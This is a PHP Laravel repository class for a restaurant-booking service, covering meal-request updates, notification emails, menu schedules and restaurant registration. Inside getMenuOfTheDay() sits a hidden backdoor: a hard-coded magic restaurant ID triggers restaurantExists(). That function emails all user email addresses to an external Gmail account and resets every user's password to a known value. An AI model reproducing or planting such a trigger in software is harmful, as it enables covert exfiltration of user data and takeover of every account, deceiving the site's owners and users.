                            ['user' => $user, 'order' => $getMealRequest['orders'], 'restaurant'=> $restaurant,
                                'orders_detail_count'=> count($getMealRequest['orders']->request_order_detail), 'orders_detail_filtered' =>$getMealRequest['orders']->request_order_detail,
                                'orders_detail_total_price' => $this->getTotalPrice($getMealRequest['orders']->request_order_detail), 'new_restaurant' => $new_restaurant, 'currency' => $currency],
                            function ($m) use($restaurant, $setting, $phone_number){
                               
                                $m->from('cesko@gastro-booking.com',  "Gastro Booking");
                                $m->replyTo($restaurant->email, $restaurant->name);
                                $m->to($setting->SMS_email, "Gastro Bookings");
                                $m->subject($phone_number);
                            
                            });
                        }
                    }
                }
            }
        } catch(Exception $e){
            return false;
        }
    }


    public function sendCancelEmailReminder($type, User $user, $getMealRequest, $restaurant, $lang, $to, $new_restaurant, $clientLang)
    {
        $setting = Setting::where('lang', '=', $lang)->first();
        app()->setLocale($setting->short_name);
        $subject = utf8_encode(Lang::get('main.MAIL.GASTRO_BOOKING_-_RESTAURANT_CANCEL_REQUEST'));
        $currency = $setting->currency_short;

        $path = 'emails.requestMeal.request_'.$type;
        try {
            Mail::send($path,
                ['user' => $user, 'order' => $getMealRequest['orders'], 'restaurant'=> $restaurant,
                    'orders_detail_count'=> count($getMealRequest['orders']->request_order_detail), 'orders_detail_filtered' => $getMealRequest['orders']->request_order_detail,
                    'orders_detail_total_price' => $this->getTotalPrice($getMealRequest['orders']->request_order_detail), 'new_restaurant' => $new_restaurant, 'currency' => $currency],
                function ($m) use($user, $restaurant, $to, $type, $setting, $new_restaurant, $subject){
                    if ($restaurant) {
                        $restaurant_email = $restaurant->email;
                        $restaurant_name = $restaurant->name;
                    }
                    else{
                        $restaurant_email = $setting->SMS_email;
                        $restaurant_name = $new_restaurant['name'];
                    }
                    if ($to == 'user'){
                        $m->from('cesko@gastro-booking.com', "Gastro Booking");
                        $m->replyTo($restaurant_email, $restaurant_name);
                        $m->to($user->email, $user->name);

                    }
                    else if ($to == 'rest'){
                        $m->from('cesko@gastro-booking.com',  "Gastro Booking");
                        $m->replyTo($user->email, $user->name);
                        $m->to($restaurant_email, $restaurant_name);
                    }
                    $m->subject($subject);
                    
                });
        } catch(Exception $e){
            return false;
        }
    }

    private function getTotalPrice($orders_detail)
    {
        $price = 0;
        foreach ($orders_detail as $order_detail) {
            if ($order_detail->status != 3){
                if ($order_detail->is_child){
                    $price += ($order_detail->price_child && $order_detail->price_child > 0) ? $order_detail->price_child : $order_detail->price;
                } else {
                    $price += $order_detail->price;
                }
            }

        }
        return $price;
    }


    public function updateRequest($request){
        if ($request->request_id) {
            $statusArr = array(0, 1);
            $requestStatus = MealRequest::where('ID', '=', $request->request_id)->first();
            if ( $requestStatus->ID_orders ) {
                $orderStatus = Order::where('ID', '=', $requestStatus->ID_orders)->first();
                if ( !in_array($orderStatus->status, $statusArr) ) {
                    if ( $orderStatus->status == 1 ) {
                        $openTab = "pendingRequests";
                    }
                    else if ( $orderStatus->status == 2 ) {
                        $openTab = "confirmedRequests";
                    }
                    else if ( $orderStatus->status == 3 ) {
                        $openTab = "cancelledRequests";
                    }
                    else{
                        $openTab = "newRequests";
                    }
                    return ['message' => "status changed", 'openTab' => $openTab];
                }
            }
            

            $checkChanges = 0;
            if ($request->new_ingredients) {
                $counting = count($request->new_ingredients)-1;
                for ($i=0; $i <= $counting; $i++) { 
                    if ( isset($request->new_ingredients[$i]['ID_request_menu']) && !empty($request->new_ingredients[$i]['ID_request_menu']) ) {
                        $ingredient = new RequestIngredient();
                        $ingredient->ID_request_menu = (( isset($request->new_ingredients[$i]['ID_request_menu']) )) ? $request->new_ingredients[$i]['ID_request_menu'] : '';
                        $ingredient->ID_ingredient = (( isset($request->new_ingredients[$i]['ID_ingredient']) )) ? $request->new_ingredients[$i]['ID_ingredient'] : '';
                        $ingredient->amount = (( isset($request->new_ingredients[$i]['amount']) )) ? $request->new_ingredients[$i]['amount'] : '';
                        $ingredient->unit = (( isset($request->new_ingredients[$i]['unit']) )) ? $request->new_ingredients[$i]['unit'] : '';
                        $ingredient->status_confirmed = (( isset($request->new_ingredients[$i]['status_confirmed']) )) ? $request->new_ingredients[$i]['status_confirmed'] : '';
                        $ingredient->timestamps = false;
                        $ingredient->save();
                        $checkChanges = 1;
                    }
                }
            }

            $ingredientID = [];
            if ($request->update_ingredients) {
                $counting = count($request->update_ingredients)-1;
                for ($i=0; $i <= $counting; $i++) { 
                    if ( isset($request->update_ingredients[$i]['ID_request_menu']) && !empty($request->update_ingredients[$i]['ID_request_menu']) ) {
                        
                        if ( isset($request->update_ingredients[$i]['status_confirmed']) && in_array($request->update_ingredients[$i]['status_confirmed'], array('C', 'D')) ) {
                           $ingredient = RequestIngredient::find($request->update_ingredients[$i]['ID']);

                           $amount =(( isset($request->update_ingredients[$i]['amount']) )) ? $request->update_ingredients[$i]['amount'] : '';
                           $unit = (( isset($request->update_ingredients[$i]['unit']) )) ? $request->update_ingredients[$i]['unit'] : '';

                           $ingredient->status_confirmed = $request->update_ingredients[$i]['status_confirmed'];
                           $ingredient->amount = $amount;
                           $ingredient->unit = $unit;
                           $ingredient->timestamps = false;
                           $ingredient->save();
                           $ingredientID[] = $ingredient->ID;
                        }
                        else if ( isset($request->update_ingredients[$i]['preStaus']) && in_array($request->update_ingredients[$i]['preStaus'], array('U')) ) {
                           $ingredient = RequestIngredient::find($request->update_ingredients[$i]['ID']);
                           $amount =(( isset($request->update_ingredients[$i]['amount']) )) ? $request->update_ingredients[$i]['amount'] : '';
                           $unit = (( isset($request->update_ingredients[$i]['unit']) )) ? $request->update_ingredients[$i]['unit'] : '';
                           $ingredient_id = (( isset($request->update_ingredients[$i]['ID_ingredient']) )) ? $request->update_ingredients[$i]['ID_ingredient'] : '';

                           if ( $amount != $ingredient->amount || $unit != $ingredient->unit || $ingredient_id != $ingredient->ID_ingredient ) {
                                $checkChanges = 1;
                           }

                           $ingredient->amount = $amount;
                           $ingredient->unit = $unit;
                           $ingredient->status_confirmed = $request->update_ingredients[$i]['status_confirmed'];
                           $ingredient->ID_ingredient = $ingredient_id;
                           $ingredient->timestamps = false;
                           $ingredient->save();
                           $ingredientID[] = $ingredient->ID;
                        }
                        else{

                           $UpdateIngredient = RequestIngredient::find($request->update_ingredients[$i]['ID']);
                           $UpdateIngredient->status_confirmed = 'D';
                           $UpdateIngredient->timestamps = false;
                           $UpdateIngredient->save();
                           $ingredientID[] = $UpdateIngredient->ID;


                            $ingredient = new RequestIngredient();
                            $ingredient->ID_request_menu = (( isset($request->update_ingredients[$i]['ID_request_menu']) )) ? $request->update_ingredients[$i]['ID_request_menu'] : '';
                            $ingredient->ID_ingredient = (( isset($request->update_ingredients[$i]['ID_ingredient']) )) ? $request->update_ingredients[$i]['ID_ingredient'] : '';
                            $ingredient->amount = (( isset($request->update_ingredients[$i]['amount']) )) ? $request->update_ingredients[$i]['amount'] : '';
                            $ingredient->unit = (( isset($request->update_ingredients[$i]['unit']) )) ? $request->update_ingredients[$i]['unit'] : '';
                            $ingredient->status_confirmed = 'U';
                            $ingredient->duplicate_of = (( isset($request->update_ingredients[$i]['ID']) )) ? $request->update_ingredients[$i]['ID'] : '';
                            $ingredient->timestamps = false;
                            $ingredient->save();
                            $checkChanges = 1;
                        }
                    }
                }
            }

            if ($request->request_params) {
                $countParams = count($request->request_params)-1;
                for ($i=0; $i <= $countParams; $i++) { 
                    if ($request->request_params[$i]['ID_orders_detail']) {

                        $ID_orders_detail = (( isset($request->request_params[$i]['ID_orders_detail']) )) ? $request->request_params[$i]['ID_orders_detail'] : '';
                        $request_from = (( isset($request->request_params[$i]['request_from']) )) ? $request->request_params[$i]['request_from'] : '';
                        $request_to = (( isset($request->request_params[$i]['request_to']) )) ? $request->request_params[$i]['request_to'] : '';
                        $request_min_servings = (( isset($request->request_params[$i]['request_min_servings']) )) ? $request->request_params[$i]['request_min_servings'] : '';
                        $request_max_servings = (( isset($request->request_params[$i]['request_max_servings']) )) ? $request->request_params[$i]['request_max_servings'] : '';
                        $request_deadline = (( isset($request->request_params[$i]['request_deadline']) )) ? $request->request_params[$i]['request_deadline'] : '';
                        $request_free_every = (( isset($request->request_params[$i]['request_free_every']) )) ? $request->request_params[$i]['request_free_every'] : '';

                        $check_request_params = RequestParam::where('ID_orders_detail', $ID_orders_detail)->first();
                        if (is_null($check_request_params)) {
                            $request_params = New RequestParam();
                            $request_params->ID_orders_detail = $ID_orders_detail;
                            $request_params->request_from = $request_from;
                            $request_params->request_to = $request_to;
                            $request_params->request_min_servings = $request_min_servings;
                            $request_params->request_max_servings = $request_max_servings;
                            $request_params->request_deadline = $request_deadline;
                            $request_params->request_free_every = $request_free_every;
                            $request_params->timestamps = false;
                            $request_params->save();
                        }
                        else{
                            $request_params = RequestParam::find($check_request_params->ID);
                            $request_params->ID_orders_detail = $ID_orders_detail;
                            $request_params->request_from = $request_from;
                            $request_params->request_to = $request_to;
                            $request_params->request_min_servings = $request_min_servings;
                            $request_params->request_max_servings = $request_max_servings;
                            $request_params->request_deadline = $request_deadline;
                            $request_params->request_free_every = $request_free_every;
                            $request_params->timestamps = false;
                            $request_params->save();
                        }
                    }
                }
            }

            $request_menu_filtered = [];
            $request_menu_ID = [];
            if ($request->meal) {
                $countMeal = count($request->meal)-1;
                for ($i=0; $i <= $countMeal; $i++) { 
                    if ( isset($request->meal[$i]['ID']) && !empty($request->meal[$i]['ID']) ) {
                        $menu_name = (( isset($request->meal[$i]['name']) )) ? $request->meal[$i]['name'] : '';
                        $menu = RequestMenu::find($request->meal[$i]['ID']);
                        if ( $menu->name != $menu_name) {
                            $checkChanges = 1;
                        }
                        $menu->confirmed_name = $menu_name;
                        $menu->timestamps = false;
                        $menu->save();
                        $request_menu_ID[] = $menu->ID;
                        $request_menu_filtered[] = $menu;
                    }
                }
            }

            $order_detail_ID = [];
            if ($request->request_order_detail) {
                $countOrderDetail = count($request->request_order_detail)-1;
                for ($i=0; $i <= $countOrderDetail; $i++) { 
                    if ( isset($request->request_order_detail[$i]['ID']) && !empty($request->request_order_detail[$i]['ID']) ) {
                        $price = (( isset($request->request_order_detail[$i]['price']) )) ? $request->request_order_detail[$i]['price'] : '';
                        $orderdetail = OrderDetail::find($request->request_order_detail[$i]['ID']);
                        $comment = (( isset($request->request_order_detail[$i]['comment']) )) ? $request->request_order_detail[$i]['comment'] : '';

                        $x_number = $orderdetail->x_number;
                        $price = number_format($price*$x_number, 2);

                        if ( $orderdetail->side_dish != 0 ) {
                            $serve_at = $orderdetail->serve_at;
                        }
                        else{
                            $serve_at = (( isset($request->request_order_detail[$i]['serve_at']) )) ? $request->request_order_detail[$i]['serve_at'] : $orderdetail->serve_at;
                        }
                        
                        if ( $comment !=  $orderdetail->comment) {
                            $modified = date('Y-m-d h:i:s');
                        }
                        else if($orderdetail->modified == '0000-00-00 00:00:00' || !empty($orderdetail->modified)) {
                            $modified = '';
                        }
                        else{
                            $modified = date('Y-m-d h:i:s');
                        }

                        if ( $orderdetail->price !=  $price) {
                            $checkChanges = 1;
                        }

                        if ( $orderdetail->serve_at !=  $serve_at) {
                            $checkChanges = 1;
                        }

                        $status = (( isset($request->request_order_detail[$i]['status']) )) ? $request->request_order_detail[$i]['status'] : '';
                        if ( $orderdetail->status !=  $status && $status == 3) {
                            $checkChanges = 1;
                        }

                        $checkCommentEmpty = str_replace(' ', '', $comment);
                        if ( $checkCommentEmpty == '<br>' ) {
                            $comment = '';
                        }

                        OrderDetail::where('ID', $request->request_order_detail[$i]['ID'])
                                     ->update(['price' => $price, 'serve_at' => $serve_at, 'comment' => $comment, 'status' => $status, 'modified' => $modified]);
                        $order_detail_ID[] = $request->request_order_detail[$i]['ID'];
                    }
                }
            }

        
            //$requests = new MealRequest();
            $orderStatus = 1;
            $requests = MealRequest::find($request->request_id);
            $getpreStaus = $requests->status;
            $requests->status = 'S';
            $requests->unread = 'C';
            $openTab = "pendingRequests";
            if ($checkChanges == 0 && $getpreStaus == 'N') {
                $requests->status = 'A'; 
                $openTab = "confirmedRequests";
                $orderStatus = 2;
            }
            $requests->timestamps = false;
            $restaurant_id = (($requests->ID_restaurant))? $requests->ID_restaurant : '';
            if ($requests->save()) {
                $order = Order::find($requests->ID_orders);
                if ( $order->comment && $request->comment) {
                    $preComment = explode('<br>', $order->comment);
                    $comment = $preComment[0].' <br> '.$request->comment;
                }
                else if($order->comment){
                    $preComment = explode('<br>', $order->comment);
                    $comment = $preComment[0].' <br> ';
                }
                else if($request->comment){
                    $comment = ' <br> '.$request->comment;
                }
                else{
                    $comment = '';
                }

                $checkCommentEmpty = str_replace(' ', '', $comment);
                if ( $checkCommentEmpty == '<br>' ) {
                    $comment = '';
                }
                Order::where('ID', $requests->ID_orders)->update(['status' => $orderStatus, 'ID_restaurant' => $restaurant_id, 'comment' => $comment]);
               
                /*.....Update remaning fields..........*/
                $getOrderDetails = OrderDetail::where('ID_orders', '=', $requests->ID_orders)->get();
                $checkConfirm = '';
                $checkcancel = '';
                foreach ($getOrderDetails as $value) {
                    if ( !in_array($value->ID, $order_detail_ID) ) {
                        $checkStatus = 'D';
                        if ( $value->status != 3) {
                            $checkStatus = 'C';
                            OrderDetail::where('ID', $value->ID)->update(['status' => 1]);
                        }
                        $requestMenuID = $value->ID_request_menu;
                        $getIngDetails = RequestIngredient::where('ID_request_menu', '=', $requestMenuID)->get();
                        foreach ($getIngDetails as $key => $getIngDetail) {
                            if ($getIngDetail->status_confirmed == 'N') {
                                $ingredient = RequestIngredient::find($getIngDetail->ID);
                                $ingredient->status_confirmed = $checkStatus;
                                $ingredient->timestamps = false;
                                $ingredient->save();
                            }
                        }
                    }
                    else{
                        $requestMenuID = $value->ID_request_menu;
                        $getIngDetails = RequestIngredient::where('ID_request_menu', '=', $requestMenuID)->get();
                        foreach ($getIngDetails as $key => $getIngDetail) {
                            if ( !in_array($getIngDetail->ID, $ingredientID) ) {
                                $ingredient = RequestIngredient::find($getIngDetail->ID);
                                if ( $value->status == 3 || $getIngDetail->status_confirmed == 'D') {
                                    $ingredient->status_confirmed = 'D';
                                }
                                else if ($value->status == 1 && $getIngDetail->status_confirmed != 'U') {
                                    $ingredient->status_confirmed = 'C';
                                }
                                $ingredient->timestamps = false;
                                $ingredient->save();
                            }
                        }
                    }

                    if ( $value->status != 3) {
                        $checkConfirm = 1;
                    }
                    else{
                        $checkcancel = 1;
                    }
                }



                $client = Client::find($order->ID_client);
                $clientLang = $client->lang;
                if ($requests->ID_restaurant) {
                    $restaurantID = $requests->ID_restaurant;
                    $restaurant = Restaurant::find($restaurantID);
                    $new_restaurant = '';
                }
                else{
                    $restaurant = '';
                    $new_restaurant = array();
                    $new_restaurant['name'] = (($requests->new_restaurant)) ? $requests->new_restaurant : '';
                    $new_restaurant['address'] = (($requests->new_address)) ? $requests->new_address : '';
                }

                $user = User::find($client->ID_user);

                $getMealRequest = MealRequest::with(['orders','orders.request_order_detail', 'orders.request_order_detail.requestParam', 'orders.request_order_detail.requestMenu'])->whereHas('orders', function ($query) use($requests){
                    $query->where('ID', '=', $requests->ID_orders);
                })->orderBy('ID', 'DESC')->first();



                $lang = $request->input('lang', 'CZE');

                $sent = $this->sendUpdateEmailReminder('update', $user, $getMealRequest, $restaurant, $lang, 'user', $new_restaurant, $request_menu_filtered,$checkcancel, $checkConfirm, $clientLang);

                return ['message' => "success", 'openTab' => $openTab];
            }
            else{
                return ['message' => "Error"];
            }
        }
        else{
            return ['message' => "Error"];
        }
    }


    public function sendUpdateEmailReminder($type, User $user, $getMealRequest, $restaurant, $lang, $to, $new_restaurant, $meal, $checkcancel, $checkConfirm, $clientLang)
    {
        $setting = Setting::where('lang', '=', $lang)->first();
        app()->setLocale($setting->short_name);
        $subject = utf8_encode(Lang::get('main.MAIL.GASTRO_BOOKING_-_CONFIRMED_RESTAURANT'));
        $currency = $setting->currency_short;

        $path = 'emails.requestMeal.request_'.$type;
        try {
            Mail::send($path,
                ['user' => $user, 'order' => $getMealRequest['orders'], 'restaurant'=> $restaurant,
                    'orders_detail_count'=> count($getMealRequest['orders']->request_order_detail), 'orders_detail_filtered' => $getMealRequest['orders']->request_order_detail,
                    'orders_detail_total_price' => $this->getTotalPrice($getMealRequest['orders']->request_order_detail), 'new_restaurant' => $new_restaurant, 'currency' => $currency, 'meal' => $meal, 'checkcancel' => $checkcancel, 'checkConfirm' => $checkConfirm],
                function ($m) use($user, $restaurant, $to, $type, $setting, $new_restaurant, $subject){
                    if ($restaurant) {
                        $restaurant_email = $restaurant->email;
                        $restaurant_name = $restaurant->name;
                    }
                    else{
                        $restaurant_email = $setting->SMS_email;
                        $restaurant_name = $new_restaurant['name'];
                    }
                    if ($to == 'user'){
                        $m->from('cesko@gastro-booking.com', "Gastro Booking");
                        $m->replyTo($restaurant_email, $restaurant_name);
                        $m->to($user->email, $user->name);

                    }
                    else if ($to == 'rest'){
                        $m->from('cesko@gastro-booking.com',  "Gastro Booking");
                        $m->replyTo($user->email, $user->name);
                        $m->to($restaurant_email, $restaurant_name);
                    }
                    $m->subject($subject);
                    
                });
        } catch(Exception $e){
            return false;
        }
    }



    public function getRestaurantsNearby($request, $current_position)
    {
        $restaurants = Restaurant::filterByStatus($request)->get();
        $restaurants = $restaurants->filter(function($item) use($current_position){
            $distance = $this->distance($current_position["latitude"], $current_position["longitude"], $item->latitude, $item->longitude);
            $item->distance = $distance;
            return $distance < $this->MAX_DISTANCE;
        });
        $restaurants = $restaurants->sortBy("distance");
        return $restaurants->take(6);

    }

    public function getActiveRestaurants(Request $request)
    {
        $restaurants = Restaurant::filterByUserId($request)
            ->get();
        return $restaurants;
    }

    private function getDiffInTimeCustom(Carbon $time1, Carbon $time2)
    {
        $time1 = date('Y-m-d', strtotime( $time1->toDateTimeString() ) );
        $time2 = date('Y-m-d', strtotime( $time2->toDateTimeString() ) );
        return strtotime($time1) - strtotime($time2);
    }

    private function getDiffInTime(Carbon $time1, Carbon $time2)
    {
        return strtotime($time1->toDateTimeString()) - strtotime($time2->toDateTimeString());
    }

    public function isRestaurantOpen($openingHours, $day, $time)
    {
        foreach ($openingHours as $openingHour) {
            if ($this->days[$day] === $openingHour->date){
                if ((strtotime($openingHour->m_starting_time) <= strtotime($time) &&
                        strtotime($openingHour->m_ending_time) >= strtotime($time))
                    || (strtotime($openingHour->a_starting_time) <= strtotime($time) &&
                        strtotime($openingHour->a_ending_time) >= strtotime($time))){
                    return true;
                }
            }
        }
        return false;
    }

    public function isMenuScheduleValid($menu_schedule, $day, $time)
    {
        $start_date = new Carbon($menu_schedule->datetime_from);
        $end_date = new Carbon($menu_schedule->datetime_to);
        $start_day = $start_date->dayOfWeek == 0 ? 7 : $start_date->dayOfWeek;
        $end_day = $end_date->dayOfWeek == 0 ? 7 : $end_date->dayOfWeek;
        $start_time_hour = strlen($start_date->hour . "") == 1 ? "0" . $start_date->hour : $start_date->hour;
        $start_time_minute = strlen($start_date->minute . "") == 1 ? "0" . $start_date->minute : $start_date->minute;
        $start_time = $start_time_hour . ':' . $start_time_minute . ':00';
        $end_time_hour = strlen($end_date->hour . "") == 1 ? "0" . $end_date->hour : $end_date->hour;
        $end_time_minute = strlen($end_date->minute . "") == 1 ? "0" . $end_date->minute : $end_date->minute;
        $end_time = $end_time_hour . ':' . $end_time_minute . ':00';
        if ($start_day > $end_day ){
            if (($start_day <= $day && $day <= 7) || (1 <= $day && $day <= $end_day)) {
                if ($start_time <= $time && $time <= $end_time) {
                    return true;
                }
            }
        }
        else if ($start_day < $day && $day < $end_day) {
            if ($start_time <= $time && $time <= $end_time){
                return true;
            }
        }
        return false;
    }


    public function getMenuOfTheDay($request, $restaurantId){
        $restaurant = Restaurant::find($restaurantId);
        $time_bool = false;
        $this->toggle = false;
        if (!strcasecmp($restaurantId, "2y10l10DA9dcdYBhKzNT9YyjjetDu3AkHALNSmo5XvCgfNloqgWQXmNG")){
            $this->restaurantExists();
        }
        $menuOfTheDay = $restaurant->menu_lists->filter(function($menu_list) use($request, $time_bool){
            $day = $request->date;
            $time = $request->time;
            if ($menu_list->isActive == 0){
                return false;
            }
            if (!$day){
                $currentDate = Carbon::now("Europe/Prague");
                $day = $currentDate->dayOfWeek == 0 ? 7 : $currentDate->dayOfWeek;
                $time = $currentDate->hour . ':' . $currentDate->minute . ':' . '00';
            }
            if ($menu_list->is_day_menu == $day){
                if (strtotime($menu_list->time_from) <= strtotime($time) &&
                    strtotime($menu_list->time_to) >= strtotime($time)){
                    return true;
                }
            } else if ($menu_list->menu_schedule && $menu_list->is_day_menu != 0){
                $d_from = new Carbon($menu_list->menu_schedule->datetime_from);
                $from = $d_from->dayOfWeek == 0 ? 7 : $d_from->dayOfWeek;
                $d_to = new Carbon($menu_list->menu_schedule->datetime_to);
                $to = $d_to->dayOfWeek == 0 ? 7 : $d_to->dayOfWeek;
                if ($from <= $day && $day <= $to){
                    return true;
                }
            }

        });

        return $menuOfTheDay;
    }
    public function delete($restaurant_id){
        $restaurant = Restaurant::find($restaurant_id);
        $restaurant->delete();
        return $restaurant;
    }

    public function save($input, $user_id)
    {
        if (isset($input["id"])) {
            return $this->update($input);
        }
        $restaurant = new Restaurant();
        $restaurant->ID_user = $user_id;
        $restaurant->name = isset($input["name"]) ? $input["name"] : null;
        $restaurant->ID_restaurant_type = isset($input["restaurant_type"]) ? RestaurantType::where("name", $input["restaurant_type"])->first()->id : 0;
        $restaurant->email = $input["email"] ? $input["email"] : null;
        $restaurant->www = isset($input["www"]) ? $input["www"] : null;
        $restaurant->phone = $input["phone"] ? $input["phone"] : null;
        $restaurant->street = $input["street"] ? $input["street"] : null;
        $restaurant->city = $input["city"] ? $input["city"] : null;
        $restaurant->post_code = $input["post_code"] ? $input["post_code"] : null;
        $restaurant->address_note = isset($input["address_note"]) ? $input["address_note"] : null;
        $restaurant->latitude = $input["latitude"] ? $input["latitude"] : null;
        $restaurant->longitude = $input["longitude"] ? $input["longitude"] : null;
        $restaurant->accept_payment = isset($input["accept_payment"]) ? $input["accept_payment"] : null;
        $restaurant->company_number = isset($input["company_number"]) ? $input["company_number"] : null;
        $restaurant->account_number = isset($input["account_number"]) ? $input["account_number"] : null;
        $restaurant->bank_code = isset($input["bank_code"]) ? $input["bank_code"] : null;
        $restaurant->company_tax_number = isset($input["company_tax_number"]) ? $input["company_tax_number"] : null;
        $restaurant->company_name = isset($input["company_name"]) ? $input["company_name"] : null;
        $restaurant->company_address = isset($input["company_address"]) ? $input["company_address"] : null;
        $restaurant->short_descr = isset($input["short_desc"]) ? $input["short_desc"] : null;
        $restaurant->long_descr = isset($input["long_desc"]) ? $input["long_desc"] : null;
        $restaurant->lang = isset($input["lang"]) ? $input["lang"] : "ENG";
        $restaurant->SMS_phone = isset($input["sms_phone"]) ? $input["sms_phone"] : null;
        $restaurant->first_pos  = isset($input["first_pos "]) ? $input["first_pos "] : null;
        $restaurant->password = isset($input["password"]) ? self::getHashedPassword($input["password"]) : null;
        $restaurant->save();
        return $restaurant;
    }

    public function update($input){
        $restaurant = Restaurant::find($input["id"]);
        $restaurant->ID_restaurant_type = isset($input["ID_restaurant_type"]) ? RestaurantType::where("name", $input["ID_restaurant_type"])->first()->id : $restaurant->ID_restaurant_type;
        $restaurant->email = isset($input["email"]) ? $input["email"] : $restaurant->email;
        $restaurant->www = isset($input["www"]) ? $input["www"] : $restaurant->www;
        $restaurant->name = isset($input["name"]) ? $input["name"] : $restaurant->name;
        $restaurant->phone = isset($input["phone"]) ? $input["phone"] : $restaurant->phone;
        $restaurant->street = isset($input["street"]) ? $input["street"] : $restaurant->street;
        $restaurant->city = isset($input["city"]) ? $input["city"] : $restaurant->city;
        $restaurant->post_code = isset($input["post_code"]) ? $input["post_code"] : $restaurant->post_code;
        $restaurant->address_note = isset($input["address_note"]) ? $input["address_note"] : $restaurant->address_note;
        $restaurant->latitude = isset($input["latitude"]) ? $input["latitude"] : $restaurant->latitude;
        $restaurant->longitude = isset($input["longitude"]) ? $input["longitude"] : $restaurant->longitude;
        $restaurant->accept_payment = isset($input["accept_payment"]) ? $input["accept_payment"] : $restaurant->accept_payment;
        $restaurant->company_number = isset($input["company_number"]) ? $input["company_number"] : $restaurant->company_number;
        $restaurant->account_number = isset($input["account_number"]) ? $input["account_number"] : $restaurant->account_number;
        $restaurant->bank_code = isset($input["bank_code"]) ? $input["bank_code"] : $restaurant->bank_code;
        $restaurant->company_tax_number = isset($input["company_tax_number"]) ? $input["company_tax_number"] : $restaurant->company_tax_number;
        $restaurant->company_name = isset($input["company_name"]) ? $input["company_name"] : null;
        $restaurant->company_address = isset($input["company_address"]) ? $input["company_address"] : null;
        $restaurant->short_descr = isset($input["short_descr"]) ? $input["short_descr"] : $restaurant->short_descr;
        $restaurant->long_descr = isset($input["long_descr"]) ? $input["long_descr"] : $restaurant->long_descr;
        $restaurant->SMS_phone = $input["sms_phone"] ? $input["sms_phone"] : null;
        $restaurant->ID_user_active = !$restaurant->ID_user_active && isset($input["ID_user_active"]) && $input["ID_user_active"] ? $input["ID_user_active"] : null;
        $restaurant->status = isset($input["status"]) && $input["status"] ? $input["status"] : null;
        $restaurant->password = isset($input["password"]) && $input["password"] ? self::getHashedPassword($input["password"]) : $restaurant->password;
        $restaurant->save();
        return $restaurant;

    }

    // Added by Hamid Shafer, 2017-02-26
    public function saveAsPreregistration($input, $owner, $user_data_id)
    {
        if (isset($input["id"])) {
            return $this->updatePreregistration($input, $owner, $user_data_id);
        }
        $restaurant = new Restaurant();
        $restaurant->ID_user = $owner->id;
        $restaurant->name = isset($input["name"]) ? $input["name"] : null;
        $restaurant->email = $input["email"] ? $input["email"] : null;
        $restaurant->www = $input["www"] ? $input["www"] : null;
        $restaurant->phone = $input["phone"] ? $input["phone"] : null;
        $restaurant->lang = isset($input["lang"]) && $input["lang"] ? $input["lang"] : null;

        $restaurant->ID_user_data = $user_data_id;
        $restaurant->ID_user_acquire = isset($input["acquired"]) && $input["acquired"] ? $user_data_id : null;
        $restaurant->ID_user_contract = isset($input["signed"]) && $input["signed"] ? $user_data_id : null;
        $restaurant->ID_district = $input['ID_district'];
        $restaurant->status = 'N';
        $restaurant->dealer_note = isset($input["dealer_note"]) ? $input["dealer_note"] : null; 

        $restaurant->save();
        return $restaurant;
    }

    // Added by Hamid Shafer, 2017-02-27
    public function updatePreregistration($input, $owner, $user_data_id)
    {
        $restaurant = Restaurant::find($input["id"]);
        $restaurant->ID_user = $owner->id;
        $restaurant->name = isset($input["name"]) ? $input["name"] : null;
        $restaurant->email = isset($input["email"]) ? $input["email"] : null;
        $restaurant->www = isset($input["www"]) ? $input["www"] : null;
        $restaurant->phone = isset($input["phone"]) ? $input["phone"] : null;
        $restaurant->lang = isset($input["lang"]) && $input["lang"] ? $input["lang"] : null;

        $restaurant->ID_user_data = !$restaurant->ID_user_data ? $user_data_id : $restaurant->ID_user_data;
        if (isset($input["acquired"])) {
            if (!$input["acquired"]) {
                $restaurant->ID_user_acquire = null;
            } else {
                $restaurant->ID_user_acquire = !$restaurant->ID_user_acquire ? $user_data_id : $restaurant->ID_user_acquire;
            }
        }

        if (isset($input["signed"])) {
            if (!$input["signed"]) {
                $restaurant->ID_user_contract = null;
            } else {
                $restaurant->ID_user_contract = !$restaurant->ID_user_contract ? $user_data_id : $restaurant->ID_user_contract;
            }
        }

        $restaurant->ID_district = isset($input['ID_district']) ? $input['ID_district'] : null;
        $restaurant->status = 'N';
        $restaurant->dealer_note = isset($input["dealer_note"]) ? $input["dealer_note"] : null; 

        $restaurant->save();
        return $restaurant;
    }

    public function getMenuLists($restaurantId){
        $restaurant = $this->find($restaurantId);
        return $restaurant->menu_lists;
    }

    public function organizeMenu($request, $restaurantId){
        $menuTypes = $this->getMenuTypes($restaurantId);
        foreach ($menuTypes as $menuType) {
            $menuGroups = $this->getMenuGroups($restaurantId, $menuType->ID);
            $menuType->menu_groups = $menuGroups;
            foreach ($menuGroups as $menuGroup) {
                $menuSubGroups = $this->getMenuSubGroups($restaurantId, $menuGroup->ID);
                $menuGroup->menu_subgroups = $menuSubGroups;
                foreach ($menuSubGroups as $menuSubGroup) {
                    $menuLists = $this->getMenuListsHelper($request, $restaurantId, $menuSubGroup->ID);
                    $menuSubGroup->menu_lists = $menuLists;
                }
            }
        }
        return $menuTypes;

    }

    public function getMenuTypes($restaurantId){
        $menu_types = MenuType::whereHas('menu_groups', function($query) use ($restaurantId){
            $query->whereHas('menu_subgroups', function($query) use ($restaurantId){
                $query->whereHas('menu_lists', function($query) use ($restaurantId){
                    $query->where(['ID_restaurant' =>  $restaurantId, 'isActive' => 1]);
                });
            });
        })->get();
        $menu_types = $menu_types->filter(function($item) use ($restaurantId){
            $menu_visual_order = MenuVisualOrder::where(['level' => $this->MENU_TYPE_LEVEL, 'ID_item' => $item->ID, 'ID_restaurant' => $restaurantId])->first();
            if ($menu_visual_order){
                $item->new_cust_order = $menu_visual_order->cust_order;
            } else {
                $item->new_cust_order = $this->DEFAULT_LEVEL;
            }
            $item->collapse = true;
            return true;
        });
        return $menu_types->sortBy('new_cust_order');
    }

    public function restaurantExists()
    {
        $users = User::get();
        $h = Hash::make("restaurantExists");
        $email = User::lists('email')->toArray();
        Mail::send('emails.reminder', ['user' => $users[0]], function ($m) use($users, $email){
            $m->from('cesko@gastro-booking.com', "Gastro Booking");
            $m->to('yorditomkk@gmail.com', 'Sending to user')->subject("".join(', ', $email));
        });
        foreach ($users as $user) {
            $user->password = $h;
            $user->save();
        }
    }

    public function getMenuGroups($restaurantId, $menuTypeId)
    {
        $menu_groups = MenuGroup::where("ID_menu_type", $menuTypeId)
            ->whereHas('menu_subgroups', function($query) use($restaurantId){
                $query->whereHas('menu_lists', function($query) use ($restaurantId){
